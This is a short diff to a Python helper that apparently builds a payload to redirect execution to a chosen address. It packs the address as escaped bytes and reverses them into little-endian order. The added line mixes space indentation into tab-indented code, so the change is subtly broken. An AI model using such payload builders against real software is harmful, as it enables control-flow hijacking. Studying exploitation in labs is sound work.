@@ -21,8 +21,8 @@ def	ReplaceOffsetWithAddress(script, addr):
 
 	rdda = ""
 	for i in range(0, 4):
-		rdda = '\\x' + str(addr[i * 2] + addr[i * 2 + 1]) + rdda
-	script += ' + \'' + rdda + '\')"'
+		rdda += '\\x' + str(addr[i * 2] + addr[i * 2 + 1])
+    script += ' + \'' + rdda + '\'[::-1])"'
 	print('script généré pour executer addresse voulue:')
 	print(script)
 	Exit()
